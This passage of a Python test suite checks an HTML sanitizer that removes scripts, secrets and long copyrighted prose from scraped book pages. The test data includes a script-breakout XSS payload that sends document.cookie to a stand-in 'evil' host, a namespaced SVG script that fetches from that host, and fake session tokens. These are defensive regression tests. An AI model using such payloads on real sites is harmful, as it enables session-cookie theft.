    Boundaries:
        - The re-embedded JSON is output-encoded so any literal </script> inside a string cannot close the element.

    On failure, first check:
        - A second script element or 'fetch(' in the output means the </script> encoding was removed from the re-embed path.
    """

    ld = {"@type": "Book", "name": "X</script><script>fetch('//evil?c='+document.cookie)</script>"}
    # Realistic hostile source: the closing tag is JSON-escaped so the browser/parser
    # keeps it as one rawtext blob whose decoded value still carries `</script>`.
    src = json.dumps(ld).replace("</", "<\\/")
    out = sanitize_ld_json(f'<script type="application/ld+json">{src}</script>')
    assert "</script><script>" not in out
    scripts = [el for el in _iter_elements(_parse(out)) if el.tag == "script"]
    assert len(scripts) == 1
    raw = "".join(c.data for c in scripts[0].children)
    assert json.loads(raw) == sanitize_json(ld)

    # Full pipeline: even a literal-`</script>` breakout attempt injects no live script.
    literal = f'<script type="application/ld+json">{json.dumps(ld)}</script>'
    piped = sanitize_html(literal, [])
    assert "fetch('//evil" not in piped


# --------------------------------------------------------------------------- #
# V-5 - prose chunked under threshold across siblings is neutralized
# --------------------------------------------------------------------------- #
def test_v5_prose_chunked_across_siblings_is_neutralized() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose (V-5) collapses marketing prose split across three sibling spans.

    Scenario:
        Given a div with three 180-char spans each below the per-span threshold but collectively long.
        When neutralize_prose is called with no keep-selectors.
        Then the chunk text is replaced by PROSE_PLACEHOLDER (V-5 [MEDIUM]).

    Boundaries:
        - Aggregate sibling text length triggers neutralization even when individual spans are under the threshold.

    On failure, first check:
        - Surviving chunk text means the aggregate-sibling detection in V-5 was removed or raised its threshold.
    """
    chunk = ("This is copyrighted marketing prose that must never ship to a public repo. " * 2)[:180]
    html = f'<div class="col"><span>{chunk}</span><span>{chunk}</span><span>{chunk}</span></div>'
    out = neutralize_prose(html, [])
    assert chunk.strip() not in out
    assert PROSE_PLACEHOLDER in out


def test_v5_long_direct_text_beside_protected_field_is_neutralized() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose (V-5) collapses long direct text beside a protected field.

    Scenario:
        Given a div with 300 chars of direct text and a '#keep' span with '978-1'; '#keep' is the keep-selector.
        When neutralize_prose is called.
        Then the long text collapses to PROSE_PLACEHOLDER and '978-1' survives.

    Boundaries:
        - V-5: long direct text nodes beside a protected element are still neutralized; the protected field is not.

    On failure, first check:
        - A surviving long text node means neutralization stops when a protected sibling is present.
    """
    long_text = "q" * 300
    html = f'<div>{long_text}<span id="keep">978-1</span></div>'
    out = neutralize_prose(html, ["#keep"])
    assert long_text not in out
    assert "978-1" in out
    assert PROSE_PLACEHOLDER in out


def test_v5_prose_container_long_text_beside_protected_field_is_neutralized() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose (V-5) collapses long prose-container text even when a protected sibling is present.

    Scenario:
        Given a 'review' class div with long prose text and a '#keep' span; '#keep' is the keep-selector.
        When neutralize_prose is called.
        Then the long prose collapses to PROSE_PLACEHOLDER and the '#keep' span value 'K' survives.

    Boundaries:
        - V-5: long prose-container text is neutralized regardless of protected siblings in the same container.

    On failure, first check:
        - Surviving prose text means the prose-container rule is suppressed when a protected field is nearby.
    """
    prose = "Loved this book and would happily recommend it to any reader who is curious. " * 2
    html = f'<div class="review">{prose}<span id="keep">K</span></div>'
    out = neutralize_prose(html, ["#keep"])
    assert prose.strip() not in out
    assert "K" in out
    assert PROSE_PLACEHOLDER in out


def test_v5_prose_chunked_into_sub_80_char_spans_is_neutralized() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose (V-5 re-fix) collapses prose chunked into many sub-80-char sibling spans.

    Scenario:
        Given a description div with ten 60-char spans, each individually below the per-node floor.
        When neutralize_prose is called with no keep-selectors.
        Then exactly one PROSE_PLACEHOLDER appears, no original sentence survives, and the div and ten spans remain.

    Boundaries:
        - Aggregate detection fires on the parent div; the DOM structure is preserved with text replaced.

    On failure, first check:
        - Surviving sentences mean the aggregate detection in V-5 re-fix was narrowed or the spans were also removed.
    """

    sentence = "Each of these sentences is exactly sixty characters long okay!"  # ~60 chars
    assert len(sentence) < sanitize.PROSE_MIN_CHARS
    spans = "".join(f"<span>{sentence}</span>" for _ in range(10))
    html = f'<div class="description">{spans}</div>'
    out = neutralize_prose(html, [])
    assert out.count(PROSE_PLACEHOLDER) == 1
    assert sentence not in out
    root = _parse(out)
    assert len(_select(root, "div.description")) == 1
    assert len(_select(root, "div.description span")) == 10


def test_neutralize_prose_keeps_short_prose_heading_for_selector() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose preserves a short prose-container heading so its selector still resolves.

    Scenario:
        Given HTML with an h1 title, an h2 'Book description' heading, and a long description span.
        When neutralize_prose is called with the h1 title selector as a keep-selector.
        Then 'Book description' and the title survive; the long span collapses to PROSE_PLACEHOLDER; and the
        'h2.t-description-heading:has-text("Book description") + span' selector still resolves to one element.

    Boundaries:
        - Over-neutralization fix: short prose-container headings are protected so downstream selectors stay valid.

    On failure, first check:
        - A missing 'Book description' heading means the over-neutralization fix was reverted and the oreilly golden will fail.
    """

    body = "Long copyrighted description sentence that must be neutralized. " * 8
    html = (
        '<div id="root">'
        '<h1 class="t-title">OReilly Book Title</h1>'
        '<h2 class="t-description-heading">Book description</h2>'
        f"<span>{body}</span>"
        "</div>"
    )
    out = neutralize_prose(html, ["h1.t-title"])
    assert "Book description" in out
    assert "OReilly Book Title" in out
    assert body.strip() not in out
    assert PROSE_PLACEHOLDER in out
    # The description selector still resolves to the (now-neutralized) span.
    matched = _select(_parse(out), 'h2.t-description-heading:has-text("Book description") + span')
    assert len(matched) == 1
    assert _text_content(matched[0]) == PROSE_PLACEHOLDER


def _keep_text_for(site: str) -> list[str]:
    """Return the detail CSS selectors for the given site, excluding description and URL/API keys."""

    skip = {"DESCRIPTION", "DESCRIPTION_ALT", "BASE_URL", "404_PAGE_TITLE"}
    out = []
    for key, value in site_constants[site].items():
        if key in skip or key.startswith("SEARCH_") or key.endswith("_API"):
            continue
        if isinstance(value, str) and value:
            out.append(value)
    return out


# Per-site representative markup: factual fields (verbatim) + a long description body.
_SITE_DESCRIPTION_MARKUP = {
    "amazon": {
        "html": (
            '<div id="dp">'
            '<span id="productTitle">Fluent Python</span>'
            '<div class="author"><a class="a-link-normal">Luciano Ramalho</a></div>'
            '<div id="rpi-attribute-book_details-isbn13"><div class="rpi-attribute-value"><span>9781492056355</span></div></div>'
            '<div id="rpi-attribute-book_details-publication_date"><div class="rpi-attribute-value"><span>April 1, 2022</span></div></div>'
            '<div id="bookDescription_feature_div"><div class="a-expander-content"><span>'
            + ("A long copyrighted marketing description of the book. " * 8)
            + "</span></div></div>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "Fluent Python",
            "AUTHORS": "Luciano Ramalho",
            "ISBN13": "9781492056355",
            "PUBLICATION_DATE": "April 1, 2022",
        },
    },
    "packtpub": {
        "html": (
            "<div>"
            '<h1 class="product-title">Learn Python</h1>'
            '<div class="authors"><span>Jane Author</span></div>'
            '<div class="product-page-rhs desktop">'
            '<span class="product-details-section-key">ISBN-13 :</span>'
            '<span class="product-details-section-value">9781800000000</span>'
            '<span class="product-details-section-key">Publication date :</span>'
            '<span class="product-details-section-value">May 2023</span>'
            "</div>"
            '<div class="product-book-content-details">'
            "<h2>Description</h2>"
            '<div class="content-text">' + ("A long copyrighted book description body here. " * 8) + "</div>"
            "</div>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "Learn Python",
            "AUTHORS": "Jane Author",
            "ISBN13": "9781800000000",
            "PUBLICATION_DATE": "May 2023",
        },
    },
    "oreilly": {
        "html": (
            '<div id="root">'
            '<h1 class="t-title">OReilly Python</h1>'
            '<a class="author-name">Sam Writer</a>'
            "<ul>"
            '<li>ISBN: <span class="value t-isbn">9780123456789</span></li>'
            '<li>Release date: <span class="value">June 2021</span></li>'
            "</ul>"
            '<h2 class="t-description-heading">Book description</h2>'
            "<span>" + ("A long copyrighted book description body here. " * 8) + "</span>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "OReilly Python",
            "AUTHORS": "Sam Writer",
            "ISBN13": "9780123456789",
            "PUBLICATION_DATE": "June 2021",
        },
    },
    "leanpub": {
        "html": (
            "<div>"
            '<h1 class="book-hero__title ltr">Leanpub Python</h1>'
            '<div class="avatar-with-name__name">Chris Maker</div>'
            '<div class="about-book__content">' + ("A long copyrighted book description body here. " * 8) + "</div>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "Leanpub Python",
            "AUTHORS": "Chris Maker",
        },
    },
}


def test_description_selectors_survive_sanitize_for_all_sites() -> None:
    """
    [Unit] sanitize: verifies sanitize_html preserves all four sites' DESCRIPTION selectors and neutralizes their content.

    Scenario:
        Given per-site HTML with factual fields (title, authors, ISBN, date) and a long description body.
        When sanitize_html is called with the site's detail keep-selectors.
        Then factual selectors resolve with text verbatim; the DESCRIPTION selector resolves and its text
        equals PROSE_PLACEHOLDER for all four sites.

    Boundaries:
        - Golden fix: neutralization must not delete the description element or its ancestors.

    On failure, first check:
        - A missing or wrong DESCRIPTION match means neutralization removed the element; check the site's keep-selectors.
    """

    for site, spec in _SITE_DESCRIPTION_MARKUP.items():
        keep_text = _keep_text_for(site)
        out = sanitize_html(spec["html"], keep_text)
        root = _parse(out)

        # Factual selectors still match, text verbatim.
        for key, expected in spec["verbatim"].items():
            selector = site_constants[site][key]
            matched = _select(root, selector)
            assert matched, f"{site}.{key} selector lost after sanitize"
            assert expected in _text_content(matched[0]), f"{site}.{key} text changed"

        # DESCRIPTION selector still matches, element kept, text neutralized.
        desc_selector = site_constants[site]["DESCRIPTION"]
        desc = _select(root, desc_selector)
        assert desc, f"{site} DESCRIPTION selector lost after sanitize"
        assert _text_content(desc[0]) == PROSE_PLACEHOLDER, f"{site} description not neutralized"


# --------------------------------------------------------------------------- #
# V-6 - opaque inline style values
# --------------------------------------------------------------------------- #
def test_v6_opaque_style_data_url_is_dropped() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (V-6) removes an inline style containing a base64 url(data:...) blob.

    Scenario:
        Given an element with a style attribute containing 'url(data:image/png;base64,<300 chars>)' and an id attr.
        When strip_secrets is called.
        Then the blob and the 'url(data:' pattern are gone; the id attribute survives.

    Boundaries:
        - V-6 [LOW]: base64 data URLs in inline styles are dropped regardless of their declared MIME type.

    On failure, first check:
        - A surviving blob means the inline-style data-URL rule was removed or narrowed to specific MIME types.
    """
    blob = "A" * 300
    out = strip_secrets(f'<div style="background:url(data:image/png;base64,{blob})" id="k">x</div>')
    assert blob not in out
    assert "url(data:" not in out
    assert 'id="k"' in out


# --------------------------------------------------------------------------- #
# V-7 - namespaced script tags are stripped
# --------------------------------------------------------------------------- #
def test_v7_namespaced_svg_script_is_stripped() -> None:
    """
    [Unit] sanitize: verifies strip_scripts_and_styles (V-7) strips a namespaced svg:script like a plain script.

    Scenario:
        Given HTML with a plain <script> and an <svg:script> element each containing executable code.
        When strip_scripts_and_styles is called.
        Then both scripts' content is removed from the output.

    Boundaries:
        - V-7 [LOW]: elements whose local name is 'script' are stripped regardless of namespace prefix.

    On failure, first check:
        - Surviving script content means the strip rule checks the full tag name rather than just the local name.
    """
    html = '<svg><script>fetch("//evil")</script></svg><svg><svg:script>alert(1)</svg:script></svg>'
    out = strip_scripts_and_styles(html)
    assert 'fetch("//evil")' not in out
    assert "alert(1)" not in out


# --------------------------------------------------------------------------- #
# top-level composition + hostile page
# --------------------------------------------------------------------------- #
def test_sanitize_text_rewrites_emails() -> None:
    """
    [Unit] sanitize: verifies sanitize_text replaces email addresses with the EMAIL_PLACEHOLDER.

    Scenario:
        Given a plain text string containing an email address with a real domain.
        When sanitize_text is called.
        Then EMAIL_PLACEHOLDER appears in the output.

    Boundaries:
        - sanitize_text is the plain-text path (for robots.txt etc.); it applies the same email rewrite as strip_secrets.

    On failure, first check:
        - A missing EMAIL_PLACEHOLDER means the email-rewrite was not applied in the sanitize_text path.
    """
    assert EMAIL_PLACEHOLDER in sanitize_text("abuse@corp-real.com")


def test_hostile_page_is_cleaned_and_neutralized() -> None:
    """
    [Unit] sanitize: verifies sanitize_html cleans a page carrying every corpus-specific secret type.

    Scenario:
        Given a full HTML page with a Set-Cookie meta, CSRF meta, __INITIAL_STATE__ JWT blob, signed srcset URL,
        a long sensitive data-*, a plain-text email, a long description div, and an ld+json blob with email and description.
        When sanitize_html is called with the '#productTitle' keep-selector.
        Then all secrets and prose are stripped/neutralized; the factual title survives; and assert_clean passes.

    Boundaries:
        - Integration of all sanitizer passes; every known corpus-specific secret type is exercised in one test.

    On failure, first check:
        - The first assertion that fails identifies which sanitizer pass regressed; trace back from the surviving value.
    """
    long_desc = "Highly confidential marketing copy that must never ship. " * 6
    ld = {
        "@type": "Book",
        "name": "Fluent Python",
        "authorEmail": "author@corp-real.com",
        "description": long_desc,
        "image": "https://cdn.test/c.jpg?X-Amz-Signature=deadbeef",
    }
    html = (
        "<!DOCTYPE html><html><head>"
        '<meta http-equiv="Set-Cookie" content="session-id=176-000">'
        '<meta name="csrf-token" content="tok-abcdef123456">'
        f'<script type="application/ld+json">{json.dumps(ld)}</script>'
        '<script>window.__INITIAL_STATE__={"auth":{"sessionToken":"eyJhbGciOiJI.eyJzdWIi.sig"}}</script>'
        "</head><body>"
        '<h1 id="productTitle">Fluent Python</h1>'
        f'<div data-session-token="{"z" * 40}">t</div>'
        '<img srcset="https://cdn.test/big.jpg?X-Amz-Signature=sig 2x">'
        "<p>Reach the author at author@corp-real.com anytime.</p>"
        f'<div id="bookDescription_feature_div">{long_desc}</div>'
        "</body></html>"
    )
    out = sanitize_html(html, ["#productTitle"])

    # Factual metadata survives.
    assert "Fluent Python" in out
    # Every secret / prose is gone.
    assert "__INITIAL_STATE__" not in out
    assert "sessionToken" not in out
    assert "eyJhbGciOiJI" not in out
    assert "X-Amz-Signature" not in out
    assert "data-session-token" not in out
    assert "author@corp-real.com" not in out
    assert "csrf-token" not in out
    assert "Set-Cookie" not in out
    assert long_desc.strip() not in out
    assert PROSE_PLACEHOLDER in out

    # The final gate passes on the sanitized output.
    assert_clean(out)
